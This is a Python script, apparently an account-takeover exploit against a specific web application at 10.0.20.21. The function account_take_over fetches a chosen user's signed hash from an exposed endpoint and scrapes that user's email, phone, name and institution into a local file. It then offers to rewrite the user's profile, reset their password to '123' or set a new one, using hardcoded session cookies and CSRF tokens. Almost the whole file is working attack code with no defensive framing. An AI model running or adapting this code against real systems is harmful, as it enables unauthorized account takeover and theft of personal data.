import subprocess,os
from bs4 import BeautifulSoup
import requests
from datetime import datetime
from scripts.common import *

def check_ip_reachability(ip_entered):
    try:
        subprocess.check_output(["ping", "-c", "1", ip_entered])
        return ip_entered
    except subprocess.CalledProcessError:
        return None
    
def generate_url(ip):
    if ip:
        url = f'http://{ip}/'
        return url
    else:
        return None
    
def get_hash(result):
    message_index = result.find("Message:")
    if message_index != -1:
        # Extract and print the content after "Message:"
        message_content = result[message_index + len("Message:"):].strip()
        return message_content
    else:
        return None

def get_hashed_4_user_id(url):
    response = requests.get(url)
    # Check the response
    if response.status_code == 200:
            # Parse the JSON response
        json_response = response.json()

            # Print only the "Message" field
        if 'Message' in json_response:
                msg = f"User id is: {id}\nMessage: {json_response['Message']}\n\n"
                result = get_hash(msg)
                return result
        else:
                return None
    else:
            return None
    
    
def get_user_profile(url):
    response = requests.get(url)

    # Check the response
    if response.status_code == 200:
        # Parse HTML content with BeautifulSoup
        soup = BeautifulSoup(response.content, 'html.parser')
        
        # Extract information
        profile_image = soup.find('div', {'class': 'profile_image'}).find('img')['src']
        email = soup.find('div', {'class': 'profile_image'}).find('p').text.strip()
        name = soup.find('p', {'class': 'fw-bold', 'style': 'color: black;'}, string='Name:').find_next('p').text.strip()
        phone = soup.find('p', {'class': 'fw-bold', 'style': 'color: black;'}, string='Phone').find_next('p').text.strip()
        username = soup.find('p', {'class': 'fw-bold', 'style': 'color: black;'}, string='Username:').find_next('p').text.strip()
        nooca_user = soup.find('p', {'class': 'fw-bold', 'style': 'color: black;'}, string='Nuuca User').find_next('p').text.strip()
        waaxda_userka = soup.find('p', {'class': 'fw-bold', 'style': 'color: black;'}, string='Waaxda User-ka').find_next('p').text.strip()
        institution = soup.find('p', {'class': 'fw-bold', 'style': 'color: black;'}, string='Institution:').find_next('p').text.strip()

        # Extract user ID from the provided HTML snippet
        user_id = soup.select_one('a[data-user-id]')['data-user-id']

        # Return the extracted information
        return {
            "User Id": user_id,
            "Profile Image": profile_image,
            "Email": email,
            "Name": name,
            "Phone": phone,
            "Username": username,
            "Nooca Userka": nooca_user,
            "Waaxda Userka": waaxda_userka,
            "Institution": institution
        }

    return None

def display_profile(get_profile,hashed):
     print(f"\n\n \t Profile For {get_profile['Name']}\n")
     get_profile["Signed_key"] = hashed
     filename = f_name(get_profile['Name'],hashed)
     write_to_file(f"{filename}",f"Profile For {get_profile['Name']}\n")
     for key,value in get_profile.items():
          print(f"{key} : {value}")
          write_to_file(f"{filename}",f"{key} : {value}\n")
     print('\n')
     write_to_file(f"{filename}",f"\n")

def edit_data(get_profile):
    data = {}
    data["csrfmiddlewaretoken"] = "Xc24vmxOKzUrubGEzZc6WBFO86jSIt9WWA1Wxy51TRczsyPdvnvLgpHwpYancLm3"
    data["magaca"] = input("Enter First Name: ")
    data["lastname"] = input("Enter Last Name: ")
    data["phone"] = input("Enter Phone: ")
    data["email"] = input("Enter Email: ")
    data["username"] = input("Enter Username: ")
    data["nuca_user"] = "Baare"
    data["instituition"] = "2"
    data["image"] = None  # You can add code to handle image input if needed
    data["gender"] = input("Enter Gender # Hint Male - Female: ")

    return data


def change_profile(url,Referer,data):
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Referer": Referer,
        "X-CSRFToken": "Xc24vmxOKzUrubGEzZc6WBFO86jSIt9WWA1Wxy51TRczsyPdvnvLgpHwpYancLm3",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": "http://10.0.20.21",
        "Connection": "close",
        "Cookie": "csrftoken=9y92cmInjssi8xjJ6ytPuYcSr21FEsnh; sessionid=farq70naoeot4oyd4zo0mm4fcbgvveef",
    }
    print(f'\n Sending Data To The Server')
    response = requests.post(url, headers=headers, data=data)
    
    if response.status_code == 200:
        return response.text
    else:
        return None
    
def update_profile_done(get_url,hashed,get_profile):
    filename = f_name(get_profile['Name'],hashed)
    print("Profile Changing ... \n")
    change_url = f'{get_url}isticmale/editpass/{hashed}/'
    Referer= f"{get_url}isticmale/userprofile/{hashed}/"
    data = edit_data(get_profile)
    update_profile = change_profile(change_url,Referer,data)
    if update_profile:
        write_to_file(f"{filename}",f"New Updating Profile ......\n")
        for key,value in data.items():
            write_to_file(f"{filename}",f"{key} : {value}\n")
        print("Successfully Changed Profile")
        write_to_file(f"{filename}",f"Successfully Changed Profile\n")
    else:
        print("Error For Changing Information")

def reset_password(get_url,hashed,new_password):
    url = f"{get_url}isticmale/resetpass/{hashed}/"
    

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Referer": f"{get_url}isticmale/resetpass/{hashed}/",
        "X-CSRFToken": "32q1kpCfqLYfjfJ1l1WicCzCe7ma194KjYem5v07Osq2XbJlB5PFbfBZGPPtcKMV",
        "X-Requested-With": "XMLHttpRequest",
        "Content-Type": "application/json",
        "Origin": "http://10.0.20.21",
        "Connection": "close",
        "Cookie": "csrftoken=q6YvVgy2yRCXO6auqe3x9NcxCSDtlLSl; sessionid=vonkpxs0t4ayyk6s3iylpi53eh8fx263",
    }
    data = {
        "new_password": new_password,
        "confirm_password": new_password,
    }
    print(f'\n Sending Data To The Server')
    response = requests.post(url, headers=headers, json=data)
    
    if response.status_code == 200:
        return response.text
    else:
        return None

def change_password(url,new_pass):
    old_pass = 123
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Referer": "http://10.0.20.21/",
        "X-CSRFToken": "7D23LW1FcAuqNFEVYEJ6nVKu2GC6uxTJ611VN8zSlSMyL2NuU22LHJMcjytBYP6Q",
        "X-Requested-With": "XMLHttpRequest",
        "Content-Type": "multipart/form-data; boundary=---------------------------42610826623760248397422450223",
        "Origin": "http://10.0.20.21",
        "Connection": "close",
        "Cookie": "csrftoken=9y92cmInjssi8xjJ6ytPuYcSr21FEsnh; sessionid=farq70naoeot4oyd4zo0mm4fcbgvveef",
    }

    data = (
        "-----------------------------42610826623760248397422450223\r\n"
        'Content-Disposition: form-data; name="csrfmiddlewaretoken"\r\n'
        "\r\n"
        "7D23LW1FcAuqNFEVYEJ6nVKu2GC6uxTJ611VN8zSlSMyL2NuU22LHJMcjytBYP6Q\r\n"
        "-----------------------------42610826623760248397422450223\r\n"
        'Content-Disposition: form-data; name="oldpass"\r\n'
        "\r\n"
        f"{old_pass}\r\n"
        "-----------------------------42610826623760248397422450223\r\n"
        'Content-Disposition: form-data; name="newpass"\r\n'
        "\r\n"
        f"{new_pass}\r\n"
        "-----------------------------42610826623760248397422450223\r\n"
        'Content-Disposition: form-data; name="confirmpass"\r\n'
        "\r\n"
        f"{new_pass}\r\n"
        "-----------------------------42610826623760248397422450223--"
    )

    print(f'\n Sending Data To The Server\n')
    response = requests.post(url, headers=headers, data=data)
    
    if response.status_code == 200:
        return response.text
    else:
        return None
    
def change_userpassword(url,new_pass):
    old_pass = 123
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Referer": "http://10.0.20.21/",
        "X-CSRFToken": "7D23LW1FcAuqNFEVYEJ6nVKu2GC6uxTJ611VN8zSlSMyL2NuU22LHJMcjytBYP6Q",
        "X-Requested-With": "XMLHttpRequest",
        "Content-Type": "multipart/form-data; boundary=---------------------------42610826623760248397422450223",
        "Origin": "http://10.0.20.21",
        "Connection": "close",
        "Cookie": "csrftoken=9y92cmInjssi8xjJ6ytPuYcSr21FEsnh; sessionid=farq70naoeot4oyd4zo0mm4fcbgvveef",
    }

    data = (
        "-----------------------------42610826623760248397422450223\r\n"
        'Content-Disposition: form-data; name="csrfmiddlewaretoken"\r\n'
        "\r\n"
        "7D23LW1FcAuqNFEVYEJ6nVKu2GC6uxTJ611VN8zSlSMyL2NuU22LHJMcjytBYP6Q\r\n"
        "-----------------------------42610826623760248397422450223\r\n"
        'Content-Disposition: form-data; name="newpass"\r\n'
        "\r\n"
        f"{new_pass}\r\n"
        "-----------------------------42610826623760248397422450223\r\n"
        'Content-Disposition: form-data; name="confirmpass"\r\n'
        "\r\n"
        f"{new_pass}\r\n"
        "-----------------------------42610826623760248397422450223--"
    )

    print(f'\n Sending Data To The Server\n')
    response = requests.post(url, headers=headers, data=data)
    
    if response.status_code == 200:
        return response.text
    else:
        return None


def account_take_over(get_url):
    
    if get_url:
        user_id = int(input("Enter User Id You want to get his signed Hash: "))
        url = f"{get_url}isticmale/signed_id/{user_id}/"
        hashed = get_hashed_4_user_id(url)
        if hashed:
            url_hashed = f'{get_url}isticmale/userprofile/{hashed}/'
            get_profile = get_user_profile(url_hashed)
            if get_profile:
                display_profile(get_profile, hashed)
                filename = f_name(get_profile['Name'],hashed)
                choose = int(input("1. Profile Change\n2. Reset Password\n3. Change User Password.\n\nChoose option (1 or 2): "))
                if choose == 1:
                    # Add code for profile change
                    update_profile_done(get_url,hashed,get_profile)
                elif choose == 2:
                    # Add code for password change
                    print("\nPerforming Password Change...")
                    reseting = reset_password(get_url,hashed,"123")
                    if reseting:
                        print(reseting)
                        write_to_file(f"{filename}",f"Password Has Been reseted\n")
                        optional = int(input("\n1. Change Passowrd\n2. No Need Change Password\n\nChoose option (1 or 2): "))
                        if optional == 1:
                            change_pass_url = f"{get_url}isticmale/changepass/{user_id}/"
                            new_password = input("\nEnter your new password: \n# hint use 8 characters include Capital and Symbols e.g(Aa@2024!$): ")
                            password_change = change_password(change_pass_url,new_password)
                            if password_change:
                                print(password_change)
                                write_to_file(f"{filename}",f"Password Has Been Changed To {new_password}\n")
                            else:
                                print(f"\nError Changing Password")

                        elif optional == 2:
                            print("\nYour Default Password is '123' ...")
                        else:
                            print("\nInvalid choice. Exiting...")

                    else:
                        print(f"\nError resetting password")
                elif choose == 3:
                    change_pass_url = f"{get_url}isticmale/changepass/{user_id}/"
                    new_password = input("\nEnter your new password: \n# hint use 8 characters include Capital and Symbols e.g(Aa@2024!$): ")
                    password_change = change_userpassword(change_pass_url,new_password)
                    if password_change:
                        print(password_change)
                        write_to_file(f"{filename}",f"Password Has Been Changed To {new_password}\n")
                    else:
                        print(f"\nError Changing Password")
                else:
                    print("\nInvalid choice. Exiting...")
            else:
                print("\nFailed to retrieve user profile.")
        else:
            print("\nFailed to get hashed ID.")
    else:
        print("\nInvalid IP address.")
